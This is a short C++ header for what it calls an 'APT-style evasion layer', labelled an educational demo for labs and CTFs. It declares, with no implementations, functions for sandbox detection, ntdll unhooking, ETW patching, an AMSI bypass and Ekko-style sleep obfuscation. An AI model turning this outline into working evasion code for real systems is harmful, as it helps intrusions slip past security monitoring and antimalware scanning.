// APT-style evasion layer - educational demo
// For authorized labs / CTF only.
#pragma once
#include <windows.h>
#include <cstddef>

namespace ev {

// environmental checks; returns true if a sandbox is suspected
bool is_sandbox();

// restore any modified bytes in ntdll's .text from a fresh disk copy
bool unhook_ntdll();

// neutralise ETW telemetry sources in this process
bool patch_etw();

// make AmsiScanBuffer a no-op (loads amsi.dll if absent)
bool bypass_amsi();

// jittered sleep; working data is encrypted while resting (Ekko-style)
void obfuscate_sleep(DWORD ms, void* buf, size_t size);

}
